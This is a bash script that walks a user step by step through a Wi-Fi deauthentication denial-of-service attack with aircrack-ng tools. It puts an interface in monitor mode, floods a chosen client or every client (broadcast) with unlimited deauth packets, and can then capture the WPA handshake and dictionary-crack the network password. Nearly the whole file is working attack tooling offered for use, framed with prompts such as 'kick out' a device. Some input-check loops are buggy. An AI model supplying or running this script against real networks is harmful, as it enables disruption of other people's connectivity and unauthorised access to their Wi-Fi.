#!/bin/bash

#How to: https://hackernoon.com/forcing-a-device-to-disconnect-from-wifi-using-a-deauthentication-attack-f664b9940142
#OUI lookup: https://hwaddress.com/?q=38%3A78%3A62



#---------------------------------------------- FUNCTIONS ----------------------------------------------
programTerminated()
{
	#Erases the control sequence ^C when Ctrl+C is pressed
	echo -ne "\\r      \\n"

	echo "Exiting"
	echo ""

	#Closes all open known terminals.
	initFunction "Closing terminals..." "2" "0.05"

	killTerminal "airodump-ng --update $aircrackUpdate $moninterface"
	sleep 0.1
	killTerminal "airodump-ng $moninterface --update $aircrackUpdate --bssid $routermac --channel $channel"
	sleep 0.1
	killTerminal "aireplay-ng --deauth 0 -c FF:FF:FF:FF:FF:FF -a $routermac $moninterface"
	sleep 0.1
	killTerminal "aireplay-ng --deauth 0 -c $victimmac -a $routermac $moninterface"
	sleep 0.1
	killTerminal "airodump-ng $moninterface --bssid $routermac --channel $channel -w /tmp/dwa_sniffed_packets"
	sleep 0.1
	killTerminal "aircrack-ng -a2 -b $routermac -w $dictionary_location dwa_sniffed_packets-01.cap"
	sleep 0.1

	#Stops the interface as monitoring
	airmon-ng stop $moninterface > /dev/null
	initFunction "Stoping $interface as monitoring interface..." "2" "0.05"

	#Deletes the sniffed packets
	rm /tmp/dwa_sniffed_packets* 2> /dev/null
	initFunction "Wiping temp files..." "2" "0.05"

	#Finished!
	echo "That's all! :)"
}

#Function for wait 12 seconds
waitFunction()
{
	#Hide the cursor to view the waiting bar without the backgorund color of the cursor
	tput civis

	#Bucle that repeats 3 times
	for count in [ 0..$aircrackUpdate ];
	do
		#Print compatible with format (-e) and without new line (-n).
		#With the \\r (\r carriage return) we erase the first char of the line,
		#so we can write another character in the same line without the prev char.
		echo -ne "| \\r"
		sleep 0.25
		echo -ne "/ \\r"
		sleep 0.25
		echo -ne "- \\r"
		sleep 0.25
		echo -ne "\ \\r"
		sleep 0.25
	done

	#Show again the cursor.
	tput cvvis

	#Erase the last character of the waitFunction and then go to the next line
	echo -ne " \\r\n"
}

#Function to show processes with uppers alternatively
initFunction()
{
	#Assing each argument to a variable.
	string=$1
	repeats=$2
	wait=$3

	#Sets all upper letters to lower.
	string=`echo -ne "$string\\r" | tr [[:upper:]] [[:lower:]]`

	#Hide the cursor
	tput civis

	#Repeat this bucle so many times of the value of the variable repeats
	for ((repeat=0;repeat<$repeats;repeat++))
	do
		#Sets the variable charNum to 0 (so we can enter to the next bucle)
		charNum=0

		#Count how many chars are in the variable string
		while (( charNum++ < ${#string} ))
		do
			#Sums une to the charNum variable and saves the result in the upperChars variable
			upperChars=`expr $charNum + 1`
			#The variable lowerChars will be the same as the variable charNum.
			lowerChars=`expr $charNum + 0`

			#So the result in the character five will be:
			#charNum: 5
			#upperChars: 6
			#lowerChars: 5


			#Repeat the point so many times as the value of the variables upperChars and lowerChars
			#The result for the previous example will be:
                        #upperChars: 6
                        #lowerChars: 5
                        #positionUpper: ......
                        #positionLower: .....
			positionUpper=`seq -s. $upperChars | tr -d '[:digit:]'`
			positionLower=`seq -s. $lowerChars | tr -d '[:digit:]'`

			#First, we pass the string to the first sed. This sed transform all dots in the variable to upper letters.
			#Each dot  represents one character of the string.
			#For example, for the string "barbecue", continuing with the previously example...
			#positionUpper: ......
			#string: BARBECue

			#Now we pass these string to the second sed. These sed do the same, but transforming the upper letters to
			#lower letters.
			#positionLower: .....
			#string: barbeCue

			#Finally colors the string.
			echo -ne $BLUE
			echo -ne "$string\\r" | sed -e 's/\('"$positionUpper"'\)/\U\1/' | sed -e 's/\('"$positionLower"'\)/\L\1/'
			echo -ne $END

			#Time that each character sets to upper
			sleep $wait
		done
	done

	#Color the final string and sets all the string to lower
	echo -ne $BLUE
	echo -ne "$string\\r" | sed -e 's/\(*\)/\L\1/'
	echo -ne $END
	echo ""

	#Show the cursor
	tput cvvis
}

#Function to open new terminal windows depending of the desktop manager installed.
#KDE and XFCE works well for this script. Gnome and LXDE probably not...
newTerminal()
{
	#In these variable we save the location of the terminals for each desktop enviroments.
	kde=`which konsole`
	xfce=`which xfce4-terminal`
	gnome=`which gnome-terminal`

	#If konsole (for kde plasma) is founded...
	if [[ $kde == '/usr/bin/konsole' ]];
	then
		#Open konsole without closing it with a specific height (avoid the window is hidden
		#by the background instruction in the final), width and position. Then execute (-e)
		#the command given in the argument $1. The output is discarded and finally, we execute it
		#in background so the program can continue independently the new terminal.
		konsole --noclose --geometry 700x400+800+0 -e $1 &> /dev/null &

	#If xfce4-terminal (for xfce) is founded...
	elif [[ $xfce == '/usr/bin/xfce4-terminal' ]];
	then
		#Will do the same as above but with the specific sintaxis for xfce
		xfce4-terminal --hold --geometry=700x400+0+0 -e="$1" 2> /dev/null &

	#If gnome-terminal (for gnome) is founded... (BETA xd)
	elif [[ $gnome == '/usr/bin/gnome-terminal(BROKEN)' ]]; #Delete (BROKEN) to enter in the elif condition
	then
		#Will do the same as above but with the specific sintaxis for gnome. Gnome It doesnt work
		#well for this application. Cant execute commands and not have a hold/no close option for
		#avoid the close of the window by the background instruction
		gnome-terminal --geometry=700x400+0+0 --command $1 2> /dev/null #&
		echo -e $RED"It seems like gnome-terminal have problems with --command option :/"$END

	#If lxterminal (for lxde) is founded... (BETA xd)
	elif [[ $lxde == '/usr/bin/lxterminal(BROKEN)' ]]; #Delete (BROKEN) to enter in the elif condition
	then
		#Will do the same as above but with the specific sintaxis for gnome. As gnome, it doesnt
		#work well because it doesnt have hold/no close option.
		lxterminal --geometry=90x30 --e $1 2> /dev/null #&

	#But if no desktop manager is founded...
	else
		#Show the commands the user need to input in a new terminal
		echo ""
		echo -e "No compatible desktop enviroment founded: KDE, XFCE, Gnome ("$LIGHTYELLOW"BETA"$END"), LXDE ("$LIGHTYELLOW"BETA"$END")"
		echo "My recommendation is to install the xfce4-terminal (I will install only the WM terminal, not the entire xfce4 desktop environment, I promise). Do you want?"
		echo ""
		echo -e $BLINK">"$END "[ y/n ]"
		read install_response
		echo ""

		#If the response for the install is yes...
		if [[ $install_response == 'y' || $install_response == 'Y' ]];
		then
			echo "Ok, this takes a few time, hold on :)"

			#Stops the interface as monitoring to connect to a known network wit internet access
			airmon-ng stop $moninterface > /dev/null
			waitFunction
			waitFunction

			#...downloads and install only xfce4-terminal, not the entire desktop enviroment.
			sudo apt-get install -y xfce4-terminal 2> /dev/null

			echo ""
			echo ""
			echo "All ready, rerun this script :p"

			#Exits the script for rerun it
			exit 0

		#But if the user tells no or whatever...
		else
			#...only prints the command that the user need to type it manually in another terminal.
			echo -e "Mh... Ok... Then please, open a new terminal and enter this -> " $CYAN$1$END

			#And the script continues running normally.
		fi
	fi
}

#Function to kill the terminals
killTerminal()
{
	#Sets to the variable the value of the argumet of the function. This way is more friendly than specify the argument directly.
	#This value is the command executed in the terminal.
	terminal_identifier=$1

	#Extracts the PID of the process with the specific command executed.
	terminalps=`ps aux | grep "$terminal_identifier" | head -n1 | tr -s " " | cut -f2 -d" "`
	#Kills the PID and the errors are sent to the null device, so when the terminals did not exist, the script will not return any error.
	sudo kill $terminalps 2> /dev/null
}



#---------------------------------------------- VARIABLES ----------------------------------------------

#Here are some variable for the text format. These variables uses escape sequences (control sequences for ANSI/VT100)
#In linux the escape sequences are \e, \033, \x1B
BLINK="\e[5m"
BOLD="\e[1m"
UNDERLINED="\e[4m"
INVERT="\e[7m"
HIDE="\e[8m"

RED="\e[31m"
BLUE="\e[34m"
BLACK="\e[40m"
WHITE="\e[37m"
CYAN="\e[36m"
LIGHTYELLOW="\e[1;33m"

UNDERRED="\e[41m"
UNDERGREEN="\e[42m"

#Obv we need a control sequence that closes the rest control sequences
END="\e[0m"

#Time in seconds for aircrack to update the monitoring
aircrackUpdate=1



#---------------------------------------------- PROGRAM ----------------------------------------------
#Initialises the trap. When the program is terminated by any reason with the code EXIT (cancelled by user,
#exiting normally, etc), the function programTerminated will be executed before the script finishes completly.
trap programTerminated EXIT

#Lets start with the script!
#Clear the terminal
clear

#Print the instructions
echo -e $RED"------------------------ DoS DEAUTHENTICATION ATTACK ------------------------"$END
echo -e $BLUE$BOLD"1)"$END$END "Type the interface you want to user for monitoring with air-crack:"
#Extract the available wireless interfaces
winterfaces=`ip addr | grep -o wlan. | uniq`
echo "Interfaces available:"
echo -e $RED$BOLD$winterfaces$END$END
echo ""
#Read what user inputs and save it in the variable interface
echo -e $BLINK">"$END "Interface"
read interface

############### response checker ###############
#Saves the format to identify the wlans interfaces
checkInterface=`echo -e "$interface" | grep ^wlan[0-9]$`

#Enters in the bucle when the user ingress an invalid format of the wlan interface (an inexistent interface).
while [[ $interface != $checkInterface ]]
do
	#Asks again for a valid interface
	echo ""
	echo -e "Enter a valid wireless interface: $RED$BOLD$winterfaces$END$END"
	echo ""
	echo -e $BLINK">"$END "Interface"
	read interface

	#Re-save the format to identify the new interface
	checkInterface=`echo -e "$interface" | grep wlan[0-9]$`

	#If the format match with the interface (valid wlan interface), exits the bucle
	if [[ $interface == $checkInterface ]];
	then
		break
	fi
done

#Start the interface selected as monitoring interface. The output is discarded
airmon-ng start $interface > /dev/null

#Open firefox with a OUI lookup webpage in backgroud to continue with the scrip
#firefox https://hwaddress.com/?q=38%3A78%3A62 &

#Saves the new monitor interface in the variable moninterface. The print the new monitor interface with blinking
echo ""
moninterface=`ip addr | grep -o wlan.m.. | uniq`
echo -e $RED"New monitor interface -> " $BLINK$moninterface$END$END

#konsole --geometry 700x400+0+0 -e airodump-ng --update 12 $moninterface 2> /dev/null &
#Passes to the function the argument (the command we wil execute in the new terminal)
newTerminal "airodump-ng --update $aircrackUpdate $moninterface"

#Calls the waitFunction to wait until the scan is ready
waitFunction

#Prints the second instruction
echo ""
echo -e $BLUE$BOLD"2)"$END$END "Type the MAC and the channel that appears in the new window of the router where you want to scan for hosts. To know at which device correspond a MAC address, visit "$UNDERLINED"https://hwaddress.com/?q=38%3A78%3A62"$END " (OUI lookup web) and search the 6 first hexadecimal digits (XX:XX:XX). This digits corresponds to the maker of the network card."
echo ""
#Read the MAC that the user want to AUDIT
echo -e $BLINK">"$END "Router MAC address (BSSID)"
read routermac

############### response checker ###############
#Pattern for the MAC address format
checkMac=`echo -e "$routermac" | grep -E ^"[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}"$`

#While the format of the MAC ingressed by the user doesnt match, enter the bucle to repeat the question
while [[ $routermac != $checkMac ]]
do
	#Asks again for a valid MAC
	echo ""
	echo -e "Enter a valid MAC address (BSSID). Example of the format: 0A:12:B0:34:3E:F2"
	echo ""
	echo -e $BLINK">"$END "Router MAC address (BSSID)"
	read routermac

	#Re-save the format to identify one MAC address
	checkMac=`echo -e "$routermac" | grep -E ^"[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}"$`

	#If the pattern match and could be a valid MAC, exit the bucle.
	if [[ $routermac == $checkMac ]];
	then
		break
	fi
done

#Read the channel where is the band of the router
echo -e $BLINK">"$END "Channel (CH)"
read channel

############### response checker ###############
#While the channel is less than 1 and more than 14, enter the bucle to repeat the question
while (( $channel < 1 || $channel > 14 ))
do
	#Asks again for a valid channel
	echo ""
	echo -e "Enter a valid channel (CH). Remember that the Wi-Fi channels goes between by 1 to 14."
	echo ""
	echo -e $BLINK">"$END "Channel (CH)"
	read channel

	#If the channel goes between 1 and 14 and could be a valid channel, exits the bucle.
	if (( $channel >= 1 && $channel <= 14 ));
	then
		break
	fi
done

#Prints the configuration with blinking
echo ""
echo -e $RED"MAC of the target router -> " $BLINK$routermac$END$END
echo -e $RED"Channel of the target router -> " $BLINK$channel$END$END
echo ""

#Closes the last terminal
killTerminal "airodump-ng --update $aircrackUpdate $moninterface"

#Now stop de monitoring interface and discard the output.
airmon-ng stop $moninterface > /dev/null
#Inmediatly, start another time the interface as monitoring but in the same channel that is the router tou audit.
#If the interface is not in the same channel as the router, the interface cant inject packets properly
airmon-ng start $interface $channel > /dev/null

#konsole --geometry 700x400+0+0 -e airodump-ng wlan1mon --update 12 --bssid $routermac --channel $channel 2> /dev/null &
#Passes to the function the argument (the command we wil execute in the new terminal)
newTerminal "airodump-ng $moninterface --update $aircrackUpdate --bssid $routermac --channel $channel"

#Calls the wait function.
waitFunction

#Initialise an infinite bucle
while true;
do
	#Prints the third instruction
	echo -e $BLUE$BOLD"3)"$END$END "Finally type the MAC of the device that you want to kick out of the wireless network. As the same, you can know at which device correspond a MAC address using the OUI lookup page."
	echo "Press Enter to inject deauth packets to de broadcast MAC (FF:FF:FF:FF:FF:FF). This affects to all hosts connected to the network."

	#Saves the input (MAC of the host victim) in the variable victimmac
	echo ""
	echo -e $BLINK">"$END "Target MAC address (STATION)"
	read victimmac
	echo ""

	#Saves the format to identify a MAC address
	checkVictimmac=`echo -e "$victimmac" | grep -E ^"[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}"$`

	#If the variable is empty (user press enter)...
	if [[ $victimmac == '' ]];
	then
		#Print that the attack is going to be done against all hosts.
		echo -e $RED"Target to kick out -> " $BLINK"All devices (FF:FF:FF:FF:FF:FF)"$END$END

	else
		############### response checker ###############
		#While the format of the MAC ingressed by the user doesnt match, enter the bucle to repeat the question
		while [[ $victimmac != $checkVictimmac ]]
		do
			#Asks again for a valid MAC
			echo ""
			echo -e "Enter a valid MAC address (STATION). Example of the format: 0A:12:B0:34:3E:F2"
			echo ""
			echo -e $BLINK">"$END "Target MAC address (STATION)"
			read victimmac

			#Re-save the format to identify one MAC address
			checkVictimmac=`echo -e "$victimmac" | grep -E ^"[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}"$`

			#If the pattern match and could be a valid MAC, exit the bucle.
			if (( $victimmac == $checkVictimmac ));
			then
				break
			fi
		done

		#Print that the attack is going to be done against the specified MAC.
		echo -e $RED"Target to kick out -> " $BLINK$victimmac$END$END
	fi

	#Closes the terminal
	killTerminal "airodump-ng $moninterface --update $aircrackUpdate --bssid $routermac --channel $channel"

	echo ""
	#Calls the function initFunction to warn the user that the attack is initialising
	initFunction "Initiating attack" "3" "0.1"
	#Erase the characters left behind by the init function
	echo -e "                         \\r"

	#If there is no MAC specified for the attack
	if [[ $victimmac == '' ]];
	then
		#Inject infinite deauth packets (--deauth 0) to disconnect all hosts (-c FF:FF:FF:FF:FF:FF) in the router
		#specified (-a $routermac) using the monitoring interface ($moninterface)
		newTerminal "aireplay-ng --deauth 0 -c FF:FF:FF:FF:FF:FF -a $routermac $moninterface"

		#This do the same but without the function newTerminal
#		konsole --noclose --geometry 700x270+1080+0 -e aireplay-ng --deauth 0 -c FF:FF:FF:FF:FF:FF -a $routermac $moninterface 2> /dev/null &
		#And this make the attack without a new terminal
#		aireplay-ng --deauth 0 -c FF:FF:FF:FF:FF:FF -a $routermac $moninterface

	#But if there is a MAC in the variable...
	else
		#Inject infinite deauth packets (--deauth 0) to disconnect the specified MAC (-c $victimmac) in the router
		#specified (-a $routermac) using the monitoring interface ($moninterface)
		newTerminal "aireplay-ng --deauth 0 -c $victimmac -a $routermac $moninterface"

		#This do the same but without the function newTerminal
#		konsole --noclose --geometry 700x270+1080+0 -e aireplay-ng --deauth 0 -c $victimmac -a $routermac $moninterface 2> /dev/null
		#And this make the attack without a new terminal
#		aireplay-ng --deauth 0 -c $victimmac -a $routermac $moninterface
	fi

	#Asks the user if want to get the handshake and crack the wifi
	echo ""
	echo -e $BLUE$BOLD"4)"$END$END "You want to try to connect to the router objective? (getting the handshake and trying passwords from dictionaries)"
	#Saves the response of the user in the variable
	echo ""
	echo -e $BLINK">"$END "[ y/n ]"
	read crack_wifi_response

	############### response checker ###############
	#If the response dosnt match with y or n, enters the bucle
	while (( $crack_wifi_response != 'y' || $crack_wifi_response != 'n' || $crack_wifi_response != 'Y' || $crack_wifi_response != 'N' ))
	do
		#Ask again for a valid response
		echo ""
		echo -e "What are you doing??? Just type any of the options y/n Y/N !!"
		echo ""
		echo -e $BLINK">"$END "[ y/n ]"
		read crack_wifi_response

		#If the response now match with y or n, exits the bucle
		if [[ $crack_wifi_response == 'y' || $crack_wifi_response == 'n' || $crack_wifi_response == 'Y' || $crack_wifi_response == 'N' ]];
		then
			break
		fi
	done

	#If we say that we wanna crack the wifi
	if [[ $crack_wifi_response == 'y' || $crack_wifi_response == 'Y' ]];
	then
		#Open a new terminal. This terminal capture packets and saves it to the /tmp path
		newTerminal "airodump-ng $moninterface --bssid $routermac --channel $channel -w /tmp/dwa_sniffed_packets"
		#A little time for script to rest
		waitFunction

		#Extracts the PID of the terminal that is sending the deauth packets and close it
		process=`ps aux | grep "aireplay-ng --deauth" | head -n 1 | tr -s " " | cut -f2 -d" "`
		kill $process &> /dev/null

		#Asks us if we see the handshake in the last opened terminal
		echo "Please type y if you alredy have the handshake or r tor retry to get."
		echo ""
		echo -e $BLINK">"$END "[ y/r ]"
		read handshake_obtained
		echo ""

	        ############### response checker ###############
		#If the response dosnt match with y or r, enters the bucle
		while (( $handshake_obtained != 'y' || $handshake_obtained != 'r' || $handshake_obtained != 'Y' || $handshake_obtained != 'R' ))
		do
			#Ask again for a valid response
			echo ""
			echo -e "What are you doing??? Just type any of the options y/r or Y/R !!"
			echo ""
			echo -e $BLINK">"$END "[ y/r ]"
			read handshake_obtained

			#If the response now match with y or r, exits the bucle
			if [[ $handshake_obtained == 'y' || $handshake_obtained == 'r' || $handshake_obtained == 'Y' || $handshake_obtained == 'R' ]];
			then
				break
			fi
		done

		#If the response is that we have the handshake
	        if [[ $handshake_obtained == 'y' || $handshake_obtained == 'Y' ]];
		then
			#Tells us that we need to put the path of the password dictionary
			echo "Type the absolute path of your password dictionary. Please, use paths without spaces."
			echo ""
			echo -e $BLINK">"$END "Path"
			read dictionary_location

			#Initialises a bucle that repeats so many times as characters have the variable dictionary_location
			while (( charNum++ < ${#dictionary_location} ))
			do
				#Extract every character in the string individually
				char=$(expr substr "$dictionary_location" $charNum 1)

				#If one character its equal to a space, enters to this bucle
				while [[ $char == " " ]]
				do
					#Asks us again for the dictionary path but without spaces
					echo ""
					echo "I said you need to use paths without spaces!!! Try to copy the dictionary to your home directory."
					echo ""
					echo -e $BLINK">"$END "Path"
					read dictionary_location

					#Re-extract each character in the chain individually. Now if ther is no spaces characters, will exit
					#this bucle. If on the contrary there is still some space, it will remain in the loop.
					char=$(expr substr "$dictionary_location" $charNum 1)
				done
			done

			#Prints the path of the dictionary
			echo ""
			echo -e $RED"Passwords dictionary -> " $BLINK$dictionary_location$END$END

			#Opens a new terminal that attacks with bruteforce and the hanshake to the wireless router.
			newTerminal "aircrack-ng -a2 -b $routermac -w $dictionary_location /tmp/dwa_sniffed_packets-01.cap"

		#If the response is that we dont have the handshake
		else
			#Do nothing. Continues to the 5th step to retry the attack
			:
		fi
	#If the response for cracking the WLAN is no (only a DoS deaut attack)
	else
		echo ""
		#Do nothing. Continues to the 5th step to retry the attack
		:
	fi

	#Asks the user if want to make another attack to other MAC address associated in the same wireless network
	echo ""
	echo -e $BLUE$BOLD"5)"$END$END "You want to MAKE or RETRY another deauth attack to another host in the same network? Press y (yes) or any key followed by enter to accept, or n followed by enter to exit the program."
	#Saves the response of the user in the variable anotherattack
	echo ""
	echo -e $BLINK">"$END "[ y/n ]"
	read anotherattack
	echo ""

	############### response checker ###############
	#If the response dosnt match with y or n, enters the bucle
	while (( $anotherattack != 'y' || $anotherattack != 'n' || $anotherattack != 'Y' || $anotherattack != 'N' ))
	do
		#Ask again for a valid response
		echo ""
		echo -e "What are you doing??? Just type any of the options y/n Y/N !!"
		echo ""
		echo -e $BLINK">"$END "[ y/n ]"
		read anotherattack

		#If the response now match with y or n, exit the bucle
		if [[ $anotherattack == 'y' || $anotherattack == 'n' || $anotherattack == 'Y' || $anotherattack == 'N' ]];
		then
			break
		fi
	done

	#If the response to make another attack is y
	if [[ $anotherattack == 'y' || $anotherattack == 'Y' ]];
	then
		#Closes the open terminals
		initFunction "Closing terminals..." "2" "0.05"

		killTerminal "airodump-ng --update $aircrackUpdate $moninterface"
		sleep 0.1
		killTerminal "airodump-ng $moninterface --update $aircrackUpdate --bssid $routermac --channel $channel"
		sleep 0.1
		killTerminal "aireplay-ng --deauth 0 -c FF:FF:FF:FF:FF:FF -a $routermac $moninterface"
		sleep 0.1
		killTerminal "aireplay-ng --deauth 0 -c $victimmac -a $routermac $moninterface"
		sleep 0.1
		killTerminal "airodump-ng $moninterface --bssid $routermac --channel $channel -w /tmp/dwa_sniffed_packets"
		sleep 0.1
		killTerminal "aircrack-ng -a2 -b $routermac -w $dictionary_location /tmp/dwa_sniffed_packets-01.cap"
		sleep 0.1

	#If we dont wanna to do another attack
	else
		#Break the bucle (the program is finishing)
		break
	fi

done

#Exit the program
exit 0
